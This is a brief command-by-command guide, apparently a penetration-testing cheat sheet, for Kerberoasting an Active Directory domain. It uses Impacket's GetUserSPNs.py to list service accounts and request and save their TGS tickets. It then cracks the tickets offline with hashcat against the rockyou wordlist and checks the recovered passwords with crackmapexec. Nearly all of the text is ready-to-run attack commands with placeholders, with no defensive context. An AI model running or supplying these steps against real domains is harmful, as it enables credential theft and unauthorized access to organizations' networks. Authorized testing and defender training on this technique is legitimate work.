---
legal-banner: true
---

### **STEP 1: SETUP IMPACKET TOOLS**

1.  Clone the Impacket repository:  
    `git clone https://github.com/SecureAuthCorp/impacket.git`
2.  Navigate to the Impacket directory:  
    `cd impacket`
3.  Install Impacket using pip:  
    `sudo python3 -m pip install .`

### **STEP 2: LISTING ACCOUNTS AND REQUESTING TGS TICKETS**

2.  Listing SPN Accounts  
    `GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME]`
3.  Requesting TGS Tickets  
    `GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request`

### **STEP 3: REQUESTING SPECIFIC TGS TICKETS AND SAVING TO FILE**

4.  Requesting a Specific TGS Ticket  
    `GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request-user [SPN-USERNAME]`
5.  Saving TGS Tickets to a File  
    `GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request-user [SPN-USERNAME] -outputfile [OUTPUT-FILE]`

### **STEP 4: CRACKING TGS TICKETS AND CONFIRMING ACCESS**

6.  Cracking TGS Tickets Offline  
    `hashcat -m 13100 [TGS-FILE] /usr/share/wordlists/rockyou.txt`
7.  Confirm access with the cracked credentials:  
    `crackmapexec smb [DC-IP] -u [USERNAME] -p [PASSWORD]`